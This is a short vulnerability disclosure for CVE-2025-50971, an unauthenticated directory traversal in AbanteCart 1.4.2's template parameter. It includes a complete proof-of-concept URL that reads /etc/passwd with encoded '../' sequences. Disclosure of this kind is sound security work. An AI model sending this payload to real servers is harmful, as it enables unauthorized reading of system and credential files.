CVE-2025-50971


AbanteCart version 1.4.2 contains an unauthenticated directory traversal vulnerability in its handling of the template parameter. An attacker can supply a crafted value containing “../” sequences to traverse outside the intended template directory and retrieve arbitrary files on the web server. This flaw allows unauthenticated remote attackers to read sensitive system files—such as /etc/passwd—and other configuration files, potentially exposing usernames, hashed passwords, private keys, or application secrets



```
https://abantecart.local/index.php?rt=r/extension/page_builder/getControllerOutput&pageTemplate=novator&route=blocks%2Fsearch&template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&layout_id=21&page_id=0&custom_block_id=0&render_mode=editor
```

![](https://github.com/4rdr/proofs/blob/main/gifs/abante-1.4.2-unauthenticated-file-traversal.gif?raw=true)
